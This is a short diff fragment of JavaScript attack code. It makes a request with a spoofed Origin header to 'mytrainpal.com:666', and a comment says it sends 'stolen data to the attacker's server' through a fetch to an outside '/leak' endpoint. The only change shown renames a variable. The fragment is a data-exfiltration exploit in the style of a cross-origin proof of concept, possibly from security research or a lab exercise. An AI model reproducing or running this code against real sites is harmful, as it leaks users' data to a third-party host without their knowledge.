@@ -6,7 +6,7 @@
     Origin: "http://mytrainpal.com:666"
   }
 })
-  .then(response => response.text())
+  .then(request => request.text())
   .then(data => {
     // Send stolen data to the attacker's server
     fetch("https://69r3ljqp.c5.rs/leak", {
